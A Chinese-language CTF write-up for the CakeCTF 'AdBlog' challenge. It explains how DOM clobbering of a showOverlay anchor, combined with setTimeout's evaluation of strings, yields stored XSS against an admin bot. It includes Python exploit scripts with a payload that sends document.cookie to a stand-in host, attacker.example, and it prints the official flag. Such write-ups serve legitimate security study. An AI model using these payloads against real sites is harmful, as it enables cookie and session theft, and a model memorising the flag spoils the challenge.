# AdBlog

## 题目简述

题目是一个可提交文章的 Web 服务。服务端在接收 `POST /` 时将标题与内容写入 Redis，随后可通过 `GET /blog/<blog_id>` 读取并展示。

`/blog/<blog_id>` 中的 `content` 先做 `base64` 解码，再交给 `DOMPurify` 清洗后写入 `innerHTML`，看上去像“有清洗的富文本”场景。

赛题还给了“report us”入口，和一个独立的审计/爬虫链路：提交的 ID 会进入 report 队列，由 Puppeteer bot 访问并触发渲染，在该环境里该 bot 的浏览器会预置 `flag` Cookie。这个 Cookie 的 `httpOnly` 为 `false`，且由浏览器执行页面逻辑时可被窃取，问题的核心是突破页面脚本中的 `showOverlay` 逻辑实现 JS 执行。

官方 flag：`CakeCTF{setTimeout_3v4lu4t3s_str1ng_4s_a_j4va5cr1pt_c0de}`

## 解题过程

### 关键观察

- `adblog/distfiles/service/app.py` 的 `GET /blog/<id>` 会把数据库中保存的 `content` 放进模板 `blog.html`，并在前端 `atob` + `DOMPurify.sanitize` 后赋值到 `innerHTML`。
- `blog.html` 有一段逻辑：
  - 若 `detectAdBlock()` 命中，定义 `showOverlay = () => { ... }`
  - 后面判断 `typeof showOverlay === 'undefined'`，否则 `setTimeout(showOverlay, 1000)`
  - 对 `showOverlay` 的类型和可执行性没有约束。
- HTML 中带有 `id="showOverlay"` 或 `name="showOverlay"` 的元素会通过浏览器命名属性机制暴露成 `window.showOverlay`，这就是 DOM Clobbering。使用 `<a>` 时，对象转字符串会得到其 `href`；`setTimeout` 收到非函数后会把该字符串当 JavaScript 源码执行。`cid:eval(...)` 中的 `cid:` 可被 JavaScript 解析成语句标签，而 DOMPurify 又允许该 URI 形式，于是后面的 `eval(...)` 得以运行。
- 官方源码里的 report 逻辑与 crawler 存在清晰链路：
  - report 服务将 `blog/<id>` 推入 Redis 的 `report` 队列（`db().rpush('report', f"blog/{blog_id}")`）
  - crawler 进程从队列取出目标后调用 Puppeteer 打开页面
  - 打开页面前显式设置了 `flag` Cookie，随后等待页面运行 3 秒。

这形成“服务端输出 + 浏览器运行时状态”复合信任边界，任何可控前端执行都能拿到 cookie。

### 利用链

官方解题脚本（`solution/solve.py`）直接用可控锚点和 `showOverlay` 进行注入测试，核心语句是：

```python
pwn_host = os.getenv("PWN_HOST", "attacker.example")
pwn_port = int(os.getenv("PWN_PORT", 18001))
payload = base64.b64encode(
    f"if (document.cookie) location.href='http://{pwn_host}:{pwn_port}/?a='+document.cookie".encode()
).decode()
payload_html = f"<a id=\"showOverlay\" name=\"showOverlay\" href=\"cid:eval(atob('{payload}'))\">"
```

执行流程为：

1. 向主站 `POST /` 提交标题与 `content=payload_html`。
2. 接口返回 `Location` 头，即新建博文路径。
3. 将 `<blog_id>` 提交到 report 服务，使其进入 `report` 队列。
4. Crawler 访问该博文时在带有 `flag` Cookie 的浏览器上下文运行脚本，触发对 `location.href` 的调用外传，得到形如 `/?a=<cookie>` 的回连。

这一链要求 `detectAdBlock()` 在管理员环境返回假；否则页面会用正常的覆盖层函数重新赋值 `showOverlay`。官方 crawler 环境允许广告探测请求成功，所以命名元素保留到 `setTimeout` 调用处。

可复现实验脚本（带占位符，不包含临时地址）：

```python
import base64
import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 8001))
PWN_HOST = os.getenv("PWN_HOST", "attacker.example")
PWN_PORT = int(os.getenv("PWN_PORT", 18001))

URL = f"http://{HOST}:{PORT}/"
exploit = base64.b64encode(
    f"if (document.cookie) location.href='http://{PWN_HOST}:{PWN_PORT}/?a='+document.cookie".encode()
).decode()

payload = f'<a id="showOverlay" name="showOverlay" href="cid:eval(atob(\'{exploit}\'))">'
resp = requests.post(URL, data={"title": "a", "content": payload}, allow_redirects=False)
print(resp.headers["Location"])
```

### 验证

- `Location` 指向 `"/blog/<blog_id>"`，说明第一步注入内容已落库并可被 `GET /blog/<id>` 渲染。
- report 服务与 crawler 源码可确认：只有推入 `report` 队列后才会触发管理员端访问并执行前端脚本。
- 当观察到外带请求 `?a=<...>` 时，`...` 中包含目标页面 Cookie，即可用于后续复用 `flag` 值。

## 方法总结

- 核心技巧：用命名锚点污染全局 `showOverlay`，再借锚点的 `href` 字符串化和 `setTimeout` 的字符串求值完成 DOM Clobbering 到 XSS 的转换。
- 识别信号：有 `innerHTML`、`setTimeout(变量)` 且变量来源含页面可控标识符；服务端存在 report/crawler 自动访问链路并预置敏感 Cookie。
- 复用要点：优先看“用户输入→存储→浏览器执行”链路是否存在类型不安全回调；把“官方修复线”与源码触发逻辑全部合并成同一闭环再验证（仅拿到队列入口还不算完成）。
